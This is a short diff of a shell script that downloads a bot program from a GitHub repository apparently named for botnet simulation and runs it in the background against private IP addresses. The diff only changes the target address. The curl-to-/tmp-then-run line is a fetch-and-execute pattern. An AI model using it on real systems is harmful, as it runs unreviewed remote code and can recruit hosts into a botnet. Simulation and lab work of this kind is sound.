@@ -6,5 +6,5 @@ then
 else 
     echo "Starting process."
     /usr/bin/curl -X GET https://raw.githubusercontent.com/dcsrps/botnet_sim/master/bot/bot_1_custom_IoT.py > /tmp/bot.py
-    python3 /tmp/bot.py 172.16.135.194 192.168.1.99 &
+    python3 /tmp/bot.py 172.16.135.194 192.168.1.1 &
 fi
